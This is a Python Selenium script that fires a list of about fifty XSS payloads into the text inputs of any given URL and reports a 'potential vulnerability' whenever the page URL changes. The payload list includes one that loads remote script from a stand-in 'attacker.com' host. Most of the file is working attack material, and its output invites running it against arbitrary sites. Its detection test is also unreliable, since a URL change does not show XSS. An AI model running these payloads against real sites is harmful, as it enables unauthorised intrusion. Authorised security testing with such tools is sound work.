from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
import time
from selenium.common.exceptions import StaleElementReferenceException, NoSuchElementException

xss_payloads_default = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<img src="x" onerror="alert(1)">',
    '<body onload="alert(1)">',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '"><img src="javascript:alert(1)">',
    '<svg><script>alert(1)</script>',
    '<details open ontoggle=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    '<form><button formaction="javascript:alert(1)">CLICKME',
    '"><iframe src="javascript:alert(1)">',
    '<input type="image" src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">CLICKME</a>',
    '<video src="javascript:alert(1)">',
    '<audio src="javascript:alert(1)">',
    '<base href="javascript:alert(1)//">',
    '<script src="data:text/javascript,alert(1)"></script>',
    '<input onfocus="alert(1)" autofocus>',
    '<button onclick="alert(1)">CLICKME</button>',
    '<marquee onstart="alert(1)">XSS</marquee>',
    '<keygen autofocus onfocus="alert(1)">',
    '<textarea onfocus="alert(1)" autofocus></textarea>',
    '<div onpointerover="alert(1)">Hover me</div>',
    '<div draggable="true" ondrag="alert(1)">Drag me</div>',
    '<span onclick="alert(1)">CLICKME</span>',
    '<select onfocus="alert(1)" autofocus><option>XSS</select>',
    '<isindex type=image src=javascript:alert(1)>',
    '<img src=x onerror="this.onerror=null; alert(1)">',
    '<img src=x onerror=alert(1)//',
    '<img src=x onerror="alert(1)";>',
    '<img src=x onerror="alert(1)">',
    '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '<img src="javascript:alert(1)">',
    '<script>alert(1)</script>',
    '<img src=1 href=1 onerror="alert(1)" >',
    '<svg><g onload="alert(1)"></g></svg>',
    '<svg/onload=alert(1)>',
    '<script x>alert(1)</script>',
    '<script src=//code.jquery.com/jquery-3.3.1.min.js></script><script>$.getScript("//attacker.com/xss.js")</script>',
    '<math><maction xlink:href="javascript:alert(1)">XSS</maction></math>',
    '<img src="x:alert(1)"/>',
    '<x onclick=alert(1)>XSS</x>',
    '<body onscroll=alert(1)>',
    '<bgsound src="javascript:alert(1)">',
    '<blink onmouseover=alert(1)>XSS</blink>',
    '<plaintext onmouseover=alert(1)>XSS'
]

def test_xss_payloads(driver, url, payloads):
    try:
        driver.get(url)
        original_url = driver.current_url
        vulnerability_found = False
        found_vulnerabilities = []

        # Find all input boxes and skip those with types 'number', 'email', and 'date'
        input_boxes = driver.find_elements(By.XPATH, "//input[@type='text' or @type='password' or @type='search' or @type='tel' or @type='url']")
        
        for payload in payloads:
            for i in range(len(input_boxes)):
                try:
                    # Re-find the element to avoid stale element reference
                    input_boxes = driver.find_elements(By.XPATH, "//input[@type='text' or @type='password' or @type='search' or @type='tel' or @type='url']")
                    input_box = input_boxes[i]
                    input_type = input_box.get_attribute('type')
                    
                    if input_type in ['number', 'email', 'date']:
                        continue

                    # Fill the input box with XSS payload
                    input_box.clear()
                    input_box.send_keys(payload)

                    # Try to submit the form
                    try:
                        input_box.submit()
                    except Exception:
                        input_box.send_keys(Keys.RETURN)

                    # Check if URL changes due to payload injection
                    time.sleep(2)  # Allow time for potential alert boxes to appear
                    current_url = driver.current_url
                    if current_url != original_url:
                        found_vulnerabilities.append({
                            "payload": payload,
                            "current_url": current_url,
                            "original_url": original_url
                        })
                        vulnerability_found = True

                except StaleElementReferenceException:
                    print("Stale element reference, retrying...")
                except NoSuchElementException:
                    print("Element not found, skipping...")

        if vulnerability_found:
            for vuln in found_vulnerabilities:
                print("Payload:", vuln["payload"])
                print("Current URL:", vuln["current_url"])
                print("Potential XSS vulnerability detected!")
                print("Original URL:", vuln["original_url"])
                print()
        else:
            print("No XSS vulnerability found. The site may be in good health. Try another site.")

    except Exception as e:
        print("Error occurred:", str(e))
